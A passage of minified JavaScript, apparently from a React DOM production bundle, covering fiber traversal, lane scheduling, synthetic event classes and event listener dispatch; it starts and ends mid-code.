Bf(t,e){if(t.indexOf("-")===-1)return typeof e.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Vf=null;function Lp(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var zf=null,rs=null,is=null;function ly(t){if(t=Ca(t)){if(typeof zf!="function")throw Error(R(280));var e=t.stateNode;e&&(e=wc(e),zf(t.stateNode,t.type,e))}}function V1(t){rs?is?is.push(t):is=[t]:rs=t}function z1(){if(rs){var t=rs,e=is;if(is=rs=null,ly(t),e)for(t=0;t<e.length;t++)ly(e[t])}}function _1(t,e){return t(e)}function $1(){}var cd=!1;function H1(t,e,n){if(cd)return t(e,n);cd=!0;try{return _1(t,e,n)}finally{cd=!1,(rs!==null||is!==null)&&($1(),z1())}}function Vo(t,e){var n=t.stateNode;if(n===null)return null;var r=wc(n);if(r===null)return null;n=r[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(t=t.type,r=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!r;break e;default:t=!1}if(t)return null;if(n&&typeof n!="function")throw Error(R(231,e,typeof n));return n}var _f=!1;if(_n)try{var Ws={};Object.defineProperty(Ws,"passive",{get:function(){_f=!0}}),window.addEventListener("test",Ws,Ws),window.removeEventListener("test",Ws,Ws)}catch{_f=!1}function uM(t,e,n,r,i,s,o,a,l){var u=Array.prototype.slice.call(arguments,3);try{e.apply(n,u)}catch(c){this.onError(c)}}var po=!1,Jl=null,Yl=!1,$f=null,cM={onError:function(t){po=!0,Jl=t}};function dM(t,e,n,r,i,s,o,a,l){po=!1,Jl=null,uM.apply(cM,arguments)}function fM(t,e,n,r,i,s,o,a,l){if(dM.apply(this,arguments),po){if(po){var u=Jl;po=!1,Jl=null}else throw Error(R(198));Yl||(Yl=!0,$f=u)}}function Mi(t){var e=t,n=t;if(t.alternate)for(;e.return;)e=e.return;else{t=e;do e=t,e.flags&4098&&(n=e.return),t=e.return;while(t)}return e.tag===3?n:null}function U1(t){if(t.tag===13){var e=t.memoizedState;if(e===null&&(t=t.alternate,t!==null&&(e=t.memoizedState)),e!==null)return e.dehydrated}return null}function uy(t){if(Mi(t)!==t)throw Error(R(188))}function hM(t){var e=t.alternate;if(!e){if(e=Mi(t),e===null)throw Error(R(188));return e!==t?null:t}for(var n=t,r=e;;){var i=n.return;if(i===null)break;var s=i.alternate;if(s===null){if(r=i.return,r!==null){n=r;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===n)return uy(i),t;if(s===r)return uy(i),e;s=s.sibling}throw Error(R(188))}if(n.return!==r.return)n=i,r=s;else{for(var o=!1,a=i.child;a;){if(a===n){o=!0,n=i,r=s;break}if(a===r){o=!0,r=i,n=s;break}a=a.sibling}if(!o){for(a=s.child;a;){if(a===n){o=!0,n=s,r=i;break}if(a===r){o=!0,r=s,n=i;break}a=a.sibling}if(!o)throw Error(R(189))}}if(n.alternate!==r)throw Error(R(190))}if(n.tag!==3)throw Error(R(188));return n.stateNode.current===n?t:e}function W1(t){return t=hM(t),t!==null?K1(t):null}function K1(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var e=K1(t);if(e!==null)return e;t=t.sibling}return null}var q1=At.unstable_scheduleCallback,cy=At.unstable_cancelCallback,pM=At.unstable_shouldYield,mM=At.unstable_requestPaint,be=At.unstable_now,gM=At.unstable_getCurrentPriorityLevel,Ip=At.unstable_ImmediatePriority,G1=At.unstable_UserBlockingPriority,Ql=At.unstable_NormalPriority,yM=At.unstable_LowPriority,J1=At.unstable_IdlePriority,gc=null,yn=null;function xM(t){if(yn&&typeof yn.onCommitFiberRoot=="function")try{yn.onCommitFiberRoot(gc,t,void 0,(t.current.flags&128)===128)}catch{}}var nn=Math.clz32?Math.clz32:SM,vM=Math.log,wM=Math.LN2;function SM(t){return t>>>=0,t===0?32:31-(vM(t)/wM|0)|0}var qa=64,Ga=4194304;function so(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function Xl(t,e){var n=t.pendingLanes;if(n===0)return 0;var r=0,i=t.suspendedLanes,s=t.pingedLanes,o=n&268435455;if(o!==0){var a=o&~i;a!==0?r=so(a):(s&=o,s!==0&&(r=so(s)))}else o=n&~i,o!==0?r=so(o):s!==0&&(r=so(s));if(r===0)return 0;if(e!==0&&e!==r&&!(e&i)&&(i=r&-r,s=e&-e,i>=s||i===16&&(s&4194240)!==0))return e;if(r&4&&(r|=n&16),e=t.entangledLanes,e!==0)for(t=t.entanglements,e&=r;0<e;)n=31-nn(e),i=1<<n,r|=t[n],e&=~i;return r}function kM(t,e){switch(t){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function bM(t,e){for(var n=t.suspendedLanes,r=t.pingedLanes,i=t.expirationTimes,s=t.pendingLanes;0<s;){var o=31-nn(s),a=1<<o,l=i[o];l===-1?(!(a&n)||a&r)&&(i[o]=kM(a,e)):l<=e&&(t.expiredLanes|=a),s&=~a}}function Hf(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function Y1(){var t=qa;return qa<<=1,!(qa&4194240)&&(qa=64),t}function dd(t){for(var e=[],n=0;31>n;n++)e.push(t);return e}function ka(t,e,n){t.pendingLanes|=e,e!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,e=31-nn(e),t[e]=n}function CM(t,e){var n=t.pendingLanes&~e;t.pendingLanes=e,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=e,t.mutableReadLanes&=e,t.entangledLanes&=e,e=t.entanglements;var r=t.eventTimes;for(t=t.expirationTimes;0<n;){var i=31-nn(n),s=1<<i;e[i]=0,r[i]=-1,t[i]=-1,n&=~s}}function jp(t,e){var n=t.entangledLanes|=e;for(t=t.entanglements;n;){var r=31-nn(n),i=1<<r;i&e|t[r]&e&&(t[r]|=e),n&=~i}}var Z=0;function Q1(t){return t&=-t,1<t?4<t?t&268435455?16:536870912:4:1}var X1,Fp,Z1,ew,tw,Uf=!1,Ja=[],gr=null,yr=null,xr=null,zo=new Map,_o=new Map,ar=[],EM="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function dy(t,e){switch(t){case"focusin":case"focusout":gr=null;break;case"dragenter":case"dragleave":yr=null;break;case"mouseover":case"mouseout":xr=null;break;case"pointerover":case"pointerout":zo.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":_o.delete(e.pointerId)}}function Ks(t,e,n,r,i,s){return t===null||t.nativeEvent!==s?(t={blockedOn:e,domEventName:n,eventSystemFlags:r,nativeEvent:s,targetContainers:[i]},e!==null&&(e=Ca(e),e!==null&&Fp(e)),t):(t.eventSystemFlags|=r,e=t.targetContainers,i!==null&&e.indexOf(i)===-1&&e.push(i),t)}function TM(t,e,n,r,i){switch(e){case"focusin":return gr=Ks(gr,t,e,n,r,i),!0;case"dragenter":return yr=Ks(yr,t,e,n,r,i),!0;case"mouseover":return xr=Ks(xr,t,e,n,r,i),!0;case"pointerover":var s=i.pointerId;return zo.set(s,Ks(zo.get(s)||null,t,e,n,r,i)),!0;case"gotpointercapture":return s=i.pointerId,_o.set(s,Ks(_o.get(s)||null,t,e,n,r,i)),!0}return!1}function nw(t){var e=Gr(t.target);if(e!==null){var n=Mi(e);if(n!==null){if(e=n.tag,e===13){if(e=U1(n),e!==null){t.blockedOn=e,tw(t.priority,function(){Z1(n)});return}}else if(e===3&&n.stateNode.current.memoizedState.isDehydrated){t.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Cl(t){if(t.blockedOn!==null)return!1;for(var e=t.targetContainers;0<e.length;){var n=Wf(t.domEventName,t.eventSystemFlags,e[0],t.nativeEvent);if(n===null){n=t.nativeEvent;var r=new n.constructor(n.type,n);Vf=r,n.target.dispatchEvent(r),Vf=null}else return e=Ca(n),e!==null&&Fp(e),t.blockedOn=n,!1;e.shift()}return!0}function fy(t,e,n){Cl(t)&&n.delete(e)}function MM(){Uf=!1,gr!==null&&Cl(gr)&&(gr=null),yr!==null&&Cl(yr)&&(yr=null),xr!==null&&Cl(xr)&&(xr=null),zo.forEach(fy),_o.forEach(fy)}function qs(t,e){t.blockedOn===e&&(t.blockedOn=null,Uf||(Uf=!0,At.unstable_scheduleCallback(At.unstable_NormalPriority,MM)))}function $o(t){function e(i){return qs(i,t)}if(0<Ja.length){qs(Ja[0],t);for(var n=1;n<Ja.length;n++){var r=Ja[n];r.blockedOn===t&&(r.blockedOn=null)}}for(gr!==null&&qs(gr,t),yr!==null&&qs(yr,t),xr!==null&&qs(xr,t),zo.forEach(e),_o.forEach(e),n=0;n<ar.length;n++)r=ar[n],r.blockedOn===t&&(r.blockedOn=null);for(;0<ar.length&&(n=ar[0],n.blockedOn===null);)nw(n),n.blockedOn===null&&ar.shift()}var ss=Gn.ReactCurrentBatchConfig,Zl=!0;function NM(t,e,n,r){var i=Z,s=ss.transition;ss.transition=null;try{Z=1,Bp(t,e,n,r)}finally{Z=i,ss.transition=s}}function AM(t,e,n,r){var i=Z,s=ss.transition;ss.transition=null;try{Z=4,Bp(t,e,n,r)}finally{Z=i,ss.transition=s}}function Bp(t,e,n,r){if(Zl){var i=Wf(t,e,n,r);if(i===null)Sd(t,e,r,eu,n),dy(t,r);else if(TM(i,t,e,n,r))r.stopPropagation();else if(dy(t,r),e&4&&-1<EM.indexOf(t)){for(;i!==null;){var s=Ca(i);if(s!==null&&X1(s),s=Wf(t,e,n,r),s===null&&Sd(t,e,r,eu,n),s===i)break;i=s}i!==null&&r.stopPropagation()}else Sd(t,e,r,null,n)}}var eu=null;function Wf(t,e,n,r){if(eu=null,t=Lp(r),t=Gr(t),t!==null)if(e=Mi(t),e===null)t=null;else if(n=e.tag,n===13){if(t=U1(e),t!==null)return t;t=null}else if(n===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;t=null}else e!==t&&(t=null);return eu=t,null}function rw(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(gM()){case Ip:return 1;case G1:return 4;case Ql:case yM:return 16;case J1:return 536870912;default:return 16}default:return 16}}var dr=null,Vp=null,El=null;function iw(){if(El)return El;var t,e=Vp,n=e.length,r,i="value"in dr?dr.value:dr.textContent,s=i.length;for(t=0;t<n&&e[t]===i[t];t++);var o=n-t;for(r=1;r<=o&&e[n-r]===i[s-r];r++);return El=i.slice(t,1<r?1-r:void 0)}function Tl(t){var e=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&e===13&&(t=13)):t=e,t===10&&(t=13),32<=t||t===13?t:0}function Ya(){return!0}function hy(){return!1}function Rt(t){function e(n,r,i,s,o){this._reactName=n,this._targetInst=i,this.type=r,this.nativeEvent=s,this.target=o,this.currentTarget=null;for(var a in t)t.hasOwnProperty(a)&&(n=t[a],this[a]=n?n(s):s[a]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?Ya:hy,this.isPropagationStopped=hy,this}return he(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=Ya)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=Ya)},persist:function(){},isPersistent:Ya}),e}var Rs={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},zp=Rt(Rs),ba=he({},Rs,{view:0,detail:0}),PM=Rt(ba),fd,hd,Gs,yc=he({},ba,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:_p,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==Gs&&(Gs&&t.type==="mousemove"?(fd=t.screenX-Gs.screenX,hd=t.screenY-Gs.screenY):hd=fd=0,Gs=t),fd)},movementY:function(t){return"movementY"in t?t.movementY:hd}}),py=Rt(yc),RM=he({},yc,{dataTransfer:0}),OM=Rt(RM),DM=he({},ba,{relatedTarget:0}),pd=Rt(DM),LM=he({},Rs,{animationName:0,elapsedTime:0,pseudoElement:0}),IM=Rt(LM),jM=he({},Rs,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),FM=Rt(jM),BM=he({},Rs,{data:0}),my=Rt(BM),VM={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},zM={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},_M={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function $M(t){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(t):(t=_M[t])?!!e[t]:!1}function _p(){return $M}var HM=he({},ba,{key:function(t){if(t.key){var e=VM[t.key]||t.key;if(e!=="Unidentified")return e}return t.type==="keypress"?(t=Tl(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?zM[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:_p,charCode:function(t){return t.type==="keypress"?Tl(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?Tl(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),UM=Rt(HM),WM=he({},yc,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),gy=Rt(WM),KM=he({},ba,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:_p}),qM=Rt(KM),GM=he({},Rs,{propertyName:0,elapsedTime:0,pseudoElement:0}),JM=Rt(GM),YM=he({},yc,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),QM=Rt(YM),XM=[9,13,27,32],$p=_n&&"CompositionEvent"in window,mo=null;_n&&"documentMode"in document&&(mo=document.documentMode);var ZM=_n&&"TextEvent"in window&&!mo,sw=_n&&(!$p||mo&&8<mo&&11>=mo),yy=" ",xy=!1;function ow(t,e){switch(t){case"keyup":return XM.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function aw(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var zi=!1;function eN(t,e){switch(t){case"compositionend":return aw(e);case"keypress":return e.which!==32?null:(xy=!0,yy);case"textInput":return t=e.data,t===yy&&xy?null:t;default:return null}}function tN(t,e){if(zi)return t==="compositionend"||!$p&&ow(t,e)?(t=iw(),El=Vp=dr=null,zi=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return sw&&e.locale!=="ko"?null:e.data;default:return null}}var nN={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function vy(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e==="input"?!!nN[t.type]:e==="textarea"}function lw(t,e,n,r){V1(r),e=tu(e,"onChange"),0<e.length&&(n=new zp("onChange","change",null,n,r),t.push({event:n,listeners:e}))}var go=null,Ho=null;function rN(t){vw(t,0)}function xc(t){var e=Hi(t);if(O1(e))return t}function iN(t,e){if(t==="change")return e}var uw=!1;if(_n){var md;if(_n){var gd="oninput"in document;if(!gd){var wy=document.createElement("div");wy.setAttribute("oninput","return;"),gd=typeof wy.oninput=="function"}md=gd}else md=!1;uw=md&&(!document.documentMode||9<document.documentMode)}function Sy(){go&&(go.detachEvent("onpropertychange",cw),Ho=go=null)}function cw(t){if(t.propertyName==="value"&&xc(Ho)){var e=[];lw(e,Ho,t,Lp(t)),H1(rN,e)}}function sN(t,e,n){t==="focusin"?(Sy(),go=e,Ho=n,go.attachEvent("onpropertychange",cw)):t==="focusout"&&Sy()}function oN(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return xc(Ho)}function aN(t,e){if(t==="click")return xc(e)}function lN(t,e){if(t==="input"||t==="change")return xc(e)}function uN(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var on=typeof Object.is=="function"?Object.is:uN;function Uo(t,e){if(on(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;var n=Object.keys(t),r=Object.keys(e);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var i=n[r];if(!Mf.call(e,i)||!on(t[i],e[i]))return!1}return!0}function ky(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function by(t,e){var n=ky(t);t=0;for(var r;n;){if(n.nodeType===3){if(r=t+n.textContent.length,t<=e&&r>=e)return{node:n,offset:e-t};t=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=ky(n)}}function dw(t,e){return t&&e?t===e?!0:t&&t.nodeType===3?!1:e&&e.nodeType===3?dw(t,e.parentNode):"contains"in t?t.contains(e):t.compareDocumentPosition?!!(t.compareDocumentPosition(e)&16):!1:!1}function fw(){for(var t=window,e=Gl();e instanceof t.HTMLIFrameElement;){try{var n=typeof e.contentWindow.location.href=="string"}catch{n=!1}if(n)t=e.contentWindow;else break;e=Gl(t.document)}return e}function Hp(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e&&(e==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||e==="textarea"||t.contentEditable==="true")}function cN(t){var e=fw(),n=t.focusedElem,r=t.selectionRange;if(e!==n&&n&&n.ownerDocument&&dw(n.ownerDocument.documentElement,n)){if(r!==null&&Hp(n)){if(e=r.start,t=r.end,t===void 0&&(t=e),"selectionStart"in n)n.selectionStart=e,n.selectionEnd=Math.min(t,n.value.length);else if(t=(e=n.ownerDocument||document)&&e.defaultView||window,t.getSelection){t=t.getSelection();var i=n.textContent.length,s=Math.min(r.start,i);r=r.end===void 0?s:Math.min(r.end,i),!t.extend&&s>r&&(i=r,r=s,s=i),i=by(n,s);var o=by(n,r);i&&o&&(t.rangeCount!==1||t.anchorNode!==i.node||t.anchorOffset!==i.offset||t.focusNode!==o.node||t.focusOffset!==o.offset)&&(e=e.createRange(),e.setStart(i.node,i.offset),t.removeAllRanges(),s>r?(t.addRange(e),t.extend(o.node,o.offset)):(e.setEnd(o.node,o.offset),t.addRange(e)))}}for(e=[],t=n;t=t.parentNode;)t.nodeType===1&&e.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<e.length;n++)t=e[n],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var dN=_n&&"documentMode"in document&&11>=document.documentMode,_i=null,Kf=null,yo=null,qf=!1;function Cy(t,e,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;qf||_i==null||_i!==Gl(r)||(r=_i,"selectionStart"in r&&Hp(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),yo&&Uo(yo,r)||(yo=r,r=tu(Kf,"onSelect"),0<r.length&&(e=new zp("onSelect","select",null,e,n),t.push({event:e,listeners:r}),e.target=_i)))}function Qa(t,e){var n={};return n[t.toLowerCase()]=e.toLowerCase(),n["Webkit"+t]="webkit"+e,n["Moz"+t]="moz"+e,n}var $i={animationend:Qa("Animation","AnimationEnd"),animationiteration:Qa("Animation","AnimationIteration"),animationstart:Qa("Animation","AnimationStart"),transitionend:Qa("Transition","TransitionEnd")},yd={},hw={};_n&&(hw=document.createElement("div").style,"AnimationEvent"in window||(delete $i.animationend.animation,delete $i.animationiteration.animation,delete $i.animationstart.animation),"TransitionEvent"in window||delete $i.transitionend.transition);function vc(t){if(yd[t])return yd[t];if(!$i[t])return t;var e=$i[t],n;for(n in e)if(e.hasOwnProperty(n)&&n in hw)return yd[t]=e[n];return t}var pw=vc("animationend"),mw=vc("animationiteration"),gw=vc("animationstart"),yw=vc("transitionend"),xw=new Map,Ey="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Ir(t,e){xw.set(t,e),Ti(e,[t])}for(var xd=0;xd<Ey.length;xd++){var vd=Ey[xd],fN=vd.toLowerCase(),hN=vd[0].toUpperCase()+vd.slice(1);Ir(fN,"on"+hN)}Ir(pw,"onAnimationEnd");Ir(mw,"onAnimationIteration");Ir(gw,"onAnimationStart");Ir("dblclick","onDoubleClick");Ir("focusin","onFocus");Ir("focusout","onBlur");Ir(yw,"onTransitionEnd");hs("onMouseEnter",["mouseout","mouseover"]);hs("onMouseLeave",["mouseout","mouseover"]);hs("onPointerEnter",["pointerout","pointerover"]);hs("onPointerLeave",["pointerout","pointerover"]);Ti("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Ti("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Ti("onBeforeInput",["compositionend","keypress","textInput","paste"]);Ti("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Ti("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Ti("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var oo="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),pN=new Set("cancel close invalid load scroll toggle".split(" ").concat(oo));function Ty(t,e,n){var r=t.type||"unknown-event";t.currentTarget=n,fM(r,e,void 0,t),t.currentTarget=null}function vw(t,e){e=(e&4)!==0;for(var n=0;n<t.length;n++){var r=t[n],i=r.event;r=r.listeners;e:{var s=void 0;if(e)for(var o=r.length-1;0<=o;o--){var a=r[o],l=a.instance,u=a.currentTarget;if(a=a.listener,l!==s&&i.isPropagationStopped())break e;Ty(i,a,u),s=l}else for(o=0;o<r.length;o++){if(a=r[o],l=a.instance,u=a.currentTarget,a=a.listener,l!==s&&i.isPropagationStopped())break e;Ty(i,a,u),s=l}}}if(Yl)throw t=$f,Yl=!1,$f=null,t}function ne(t,e){var n=e[Xf];n===void 0&&(n=e[Xf]=new Set);var r=t+"__bubble";n.has(r)||(ww(e,t,2,!1),n.add(r))}function wd(t,e,n){var r=0;e&&(r|=4),ww(n,t,r,e)}var Xa="_reactListening"+Math.random().toString(36).slice(2);function Wo(t){if(!t[Xa]){t[Xa]=!0,M1.forEach(function(n){n!=="selectionchange"&&(pN.has(n)||wd(n,!1,t),wd(n,!0,t))});var e=t.nodeType===9?t:t.ownerDocument;e===null||e[Xa]||(e[Xa]=!0,wd("selectionchange",!1,e))}}function ww(t,e,n,r){switch(rw(e)){case 1:var i=NM;break;case 4:i=AM;break;default:i=Bp}n=i.bind(null,e,n,t),i=void 0,!_f||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(i=!0),r?i!==void 0?t.addEventListener(e,n,{capture:!0,passive:i}):t.addEventListener(e,n,!0):i!==void 0?t.addEventListener(e,n,{passive:i}):t.addEventListener(e,n,!1)}function Sd(t,e,n,r,i){var s=r;if(!(e&1)&&!(e&2)&&r!==null)e:for(;;){if(r===null)return;var o=r.tag;if(o===3||o===4){var a=r.stateNode.containerInfo;if(a===i||a.nodeType===8&&a.parentNode===i)break;if(o===4)for(o=r.return;o!==null;){var l=o.tag;if((l===3||l===4)&&(l=o.stateNode.containerInfo,l===i||l.nodeType===8&&l.parentNode===i))return;o=o.return}for(;a!==null;){if(o=Gr(a),o===null)return;if(l=o.tag,l===5||l===6){r=s=o;continue e}a=a.parentNode}}r=r.return}H1(function(){var u=s,c=Lp(n),d=[];e:{var f=xw.get(t);if(f!==void 0){var h=zp,p=t;switch(t){case"keypress":if(Tl(n)===0)break e;case"keydown":case"keyup":h=UM;break;case"focusin":p="focus",h=pd;break;case"focusout":p="blur",h=pd;break;case"beforeblur":case"afterblur":h=pd;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":h=py;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":h=OM;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":h=qM;break;case pw:case mw:case gw:h=IM;break;case yw:h=JM;break;case"scroll":h=PM;break;case"wheel":h=QM;break;case"copy":case"cut":case"paste":h=FM;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":h=gy}var y=(e&4)!==0,x=!y&&t==="scroll",g=y?f!==null?f+"Capture":null:f;y=[];for(var v=u,w;v!==null;){w=v;var b=w.stateNode;if(w.tag===5&&b!==null&&(w=b,g!==null&&(b=Vo(v,g),b!=null&&y.push(Ko(v,b,w)))),x)break;v=v.return}0<y.length&&(f=new h(f,p,null,n,c),d.push({event:f,listeners:y}))}}if(!(e&7)){e:{if(f=t==="mouseover"||t==="pointerover",h=t==="mouseout"||t==="pointerout",f&&n!==Vf&&(p=n.relatedTarget||n.fromElement)&&(Gr(p)||p[$n]))break e;if((h||f)&&(f=c.window===c?c:(f=c.ownerDocument)?f.defaultView||f.parentWindow:window,h?(p=n.relatedTarget||n.toElement,h=u,p=p?Gr(p):null,p!==null&&(x=Mi(p),p!==x||p.tag!==5&&p.tag!==6)&&(p=null)):(h=null,p=u),h!==p)){if(y=py,b="onMouseLeave",g="onMouseEnter",v="mouse",(t==="pointerout"||t==="pointerover")&&(y=gy,b="onPointerLeave",g="onPointerEnter",v="pointer"),x=h==null?f:Hi(h),w=p==null?f:Hi(p),f=new y(b,v+"leave",h,n,c),f.target=x,f.relatedTarget=w,b=null,Gr(c)===u&&(y=new 